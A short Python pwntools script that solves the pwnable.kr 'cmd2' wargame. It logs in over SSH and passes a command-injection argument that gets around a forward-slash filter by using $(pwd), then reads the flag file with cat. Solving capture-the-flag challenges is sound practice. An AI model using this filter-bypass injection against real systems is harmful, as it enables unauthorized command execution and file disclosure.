from pwn import *

# cmd2
host = 'pwnable.kr'
user = 'cmd2'
password = 'mommy now I get what PATH environment is for :)'
port = 2222

# Notes
#   * There are several ways to solve this problem. Most of them boil down to
#     being able to produce a forward slash character. This solution,
#     shamelessly stolen from victor-li, obtains a forward slash by cd'ing to
#     `/` and using `$(pwd)`.
#   * https://github.com/victor-li/pwnable.kr-write-ups/blob/master/cmd2/cmd2.md

def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  argv1 = "cd ..; cd ..; $(pwd)bin$(pwd)cat $(pwd)home$(pwd)cmd2$(pwd)fla*"
  p = s.process(['./cmd2', argv1])
  print p.recvall()

if __name__ == '__main__':
  attack()
